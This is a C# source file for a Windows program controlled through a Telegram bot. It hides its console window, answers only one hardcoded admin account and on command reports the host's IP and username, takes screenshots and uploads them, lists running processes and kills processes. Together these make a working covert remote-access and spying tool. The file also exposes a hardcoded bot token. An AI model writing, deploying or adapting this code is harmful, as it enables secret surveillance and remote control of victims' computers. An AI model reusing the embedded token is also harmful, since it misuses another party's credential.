using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Fabric;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Management;
using System.Threading;

namespace TelegramBotBot
{
    class Program
    {
        //static Api Bot;
        static int AdminId = 475020787;

        private static readonly TelegramBotClient BotTest = new TelegramBotClient("1302774749:AAG8KyWtPSeW2JDYJKX7ngmNgm-CFCfvTfk");
        private static readonly string PathToFile = Environment.CurrentDirectory + @"\screen.jpg";

        // Retrive the Name of HOST
        private static string hostName = Dns.GetHostName();

        // Get the IP
        [Obsolete]
        private static string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {

            HideConsoleWindow();

            // Show
            //ShowWindow(handle, SW_SHOW);

            BotTest.OnMessage += Bot_OnMessageAsync;
            BotTest.OnMessageEdited += Bot_OnMessageAsync;

            BotTest.StartReceiving();
            Console.ReadLine();
            BotTest.StopReceiving();
        }

        /// <summary>
        /// 
        /// </summary>
        public static void ShowConsoleWindow()
        {
            var handle = GetConsoleWindow();

            if (handle == IntPtr.Zero)
            {
                AllocConsole();
            }
            else
            {
                ShowWindow(handle, SW_SHOW);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        public static void HideConsoleWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        private static async void Bot_OnMessageAsync(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            if (e.Message.From.Id == AdminId)
            {
                if (e.Message.Type == MessageType.TextMessage)
                {
                    //if (e.Message.Text == "How are you?")
                    //    await BotTest.SendTextMessageAsync(e.Message.Chat.Id, "Fine, thank you) And you?");
                    //else if (e.Message.Text == "Good morning)")
                    //{
                    //    await BotTest.SendTextMessageAsync(e.Message.Chat.Id, "Good morning, " + e.Message.Chat.Username);
                    //}
                    //else if (e.Message.Text.ToLower() == "screen")
                    //{
                    //    ScreenShot(PathToFile);

                    //    if (System.IO.File.Exists(PathToFile))
                    //        using (var stream = new FileStream(PathToFile, FileMode.Open, FileAccess.Read, FileShare.Read))
                    //        {
                    //            await BotTest.SendDocumentAsync(
                    //               chatId: e.Message.Chat.Id,
                    //               document: new FileToSend(stream.Name, stream),
                    //               caption: $"Screenshot! IP:{myIP} User:{Environment.UserName}"
                    //           );
                    //        }
                    //}

                    switch (e.Message.Text.ToLower())
                    {
                        case "hi":
                            await BotTest.SendTextMessageAsync(e.Message.Chat.Id, "Hi");
                            break;
                        case "?":
                            await BotTest.SendTextMessageAsync(e.Message.Chat.Id, $"I'am IP:{myIP} User:{Environment.UserName}");
                            break;
                        case "how are you ? ":
                            await BotTest.SendTextMessageAsync(e.Message.Chat.Id, "Fine, thank you) And you?");
                            break;
                        case "good morning)":
                            await BotTest.SendTextMessageAsync(e.Message.Chat.Id, "Good morning, " + e.Message.Chat.Username);
                            break;
                        case "screen":
                            // string PathToFile_ = @"d:\screen.jpg";
                            //ScreenShot(PathToFile);
                            try
                            {
                                ScreenShot(PathToFile);
                                if (System.IO.File.Exists(PathToFile))
                                    using (var stream = new FileStream(PathToFile, FileMode.Open, FileAccess.Read, FileShare.Read))
                                    {
                                        await BotTest.SendDocumentAsync(
                                           chatId: e.Message.Chat.Id,
                                           document: new FileToSend(stream.Name, stream),
                                           caption: $"Screenshot! IP:{myIP} User:{Environment.UserName}"
                                       );
                                    }
                            }
                            catch { }
                            break;
                        case "pr":
                            try
                            {

                                int i = 0;
                                foreach (Process process in Process.GetProcesses())
                                {
                                    // выводим id и имя процесса
                                    //Console.WriteLine($"ID: {process.Id}  Name: {process.ProcessName}");
                                    i++;
                                    await BotTest.SendTextMessageAsync(e.Message.Chat.Id, $"{i} ID: {process.Id}  Name: {process.ProcessName}");
                                    Thread.Sleep(100);
                                }
                            }
                            catch {}
                            break;

                        case string ax when ax.Contains("kill"):
                            string a = e.Message.Text.ToLower();
                            int value;
                            int.TryParse(string.Join("", a.Where(c => char.IsDigit(c))), out value);
                            try
                            {
                                KillProcessAndChildren(value);
                            }
                            catch{}
                            break;

                        case string b when b.Contains("test"):
                            break;
                        default:
                            Console.WriteLine("команда неизвестна");
                            await BotTest.SendTextMessageAsync(e.Message.Chat.Id, "команда неизвестна");
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Kill a process, and all of its children, grandchildren, etc.
        /// </summary>
        /// <param name="pid">Process ID.</param>
        private static void KillProcessAndChildren(int pid)
        {
            // Cannot close 'system idle process'.
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch (ArgumentException)
            {
                // Process already exited.
            }
        }

        static void ScreenShot(string name)
        {
            //Graphics graph;
            //var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            //graph = Graphics.FromImage(bmp);

            //graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);

            ////bmp.Save(name);
            //bmp.Save(@"d:\screen.jpg");

            Graphics graph;
            Bitmap bmp = null;
            try
            {
                bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                graph = Graphics.FromImage(bmp);

                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);



                bmp.Save(name);
            }
            finally
            {
                if (bmp != null)
                    bmp.Dispose();
            }
        }
    }
}

